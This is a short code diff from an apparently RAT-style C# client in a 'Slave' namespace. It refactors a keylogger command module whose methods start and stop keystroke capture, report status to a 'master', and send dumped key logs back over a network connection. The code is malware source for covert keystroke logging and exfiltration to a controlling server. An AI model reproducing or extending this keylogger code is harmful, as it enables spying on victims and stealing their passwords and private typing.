@@ -8,9 +8,7 @@ namespace Slave.Commands.KeyLogger
     {
         public string name { get; } = "keylogger";
 
-        KeyLoggerManager keyLoggerManager { get; set; }
-
-        public void GetKeyLoggerManagerInstance(KeyLoggerManager manager) => keyLoggerManager = manager;
+        public KeyLoggerManager keyLoggerManager { get; set; } = new KeyLoggerManager();
         
 
         public void Process(List<string> args)
@@ -32,12 +30,20 @@ namespace Slave.Commands.KeyLogger
             }
         }
 
-        void StartKeylogger() => keyLoggerManager.StartListening();
+        void StartKeylogger()
+        {
+            keyLoggerManager.StartListening();
+            SendKeyloggerStatusToMaster();
+        }
 
-        void StopKeylogger() => keyLoggerManager.StopListening();
+        void StopKeylogger()
+        {
+            keyLoggerManager.StopListening();
+            SendKeyloggerStatusToMaster();
+        }
 
         void SendKeyloggerStatusToMaster() =>
-            SlaveCommandsManager.networkManager.WriteLine(keyLoggerManager.GetStatus() ? "The keylogger is running" : "The keylogger isn't started");
+            SlaveCommandsManager.networkManager.WriteLine(keyLoggerManager.GetStatus() ? "on" : "off");
 
         void SendKeyLogsToMaster() =>
             SlaveCommandsManager.networkManager.WriteLine(keyLoggerManager.DumpLogs());
